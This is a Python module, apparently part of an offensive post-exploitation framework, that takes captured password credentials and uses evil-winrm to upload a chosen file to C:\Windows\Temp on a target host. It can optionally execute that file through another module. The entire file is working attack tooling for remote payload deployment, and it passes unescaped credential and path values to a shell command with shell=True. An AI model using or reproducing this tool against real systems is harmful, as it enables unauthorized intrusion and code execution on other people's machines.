import os
import subprocess
from argparse import Namespace

REQUIRES = ["creds"]
PROVIDES = []

def run(data, cred, args):
    ip = data["ip"]

    user = cred.get("user")
    secret = cred.get("secret")
    cred_type = cred.get("type")

    if cred_type != "password":
        print("[!] exec.upload only supports password auth")
        return data

    if not user or not secret:
        print("[!] Missing valid credentials")
        return data

    local_file = args.file

    if not os.path.exists(local_file):
        print(f"[!] File not found: {local_file}")
        return data

    filename = os.path.basename(local_file)
    remote_path = f"C:\\Windows\\Temp\\{filename}"

    # Upload via evil-winrm
    upload_cmd = (
        f'echo "upload {local_file} {remote_path}" | '
        f'evil-winrm -i {ip} -u {user} -p {secret}'
    )

    print(f"[*] Running: {upload_cmd}")
    subprocess.run(upload_cmd, shell=True)

    print(f"[+] Uploaded to {remote_path}")

    # Optional execution
    if getattr(args, "run", False):
        print(f"[*] Executing: {remote_path}")

        from modules.exec.win import run as exec_win

        exec_args = Namespace(cmd=remote_path)
        exec_win(data, cred, exec_args)

    return data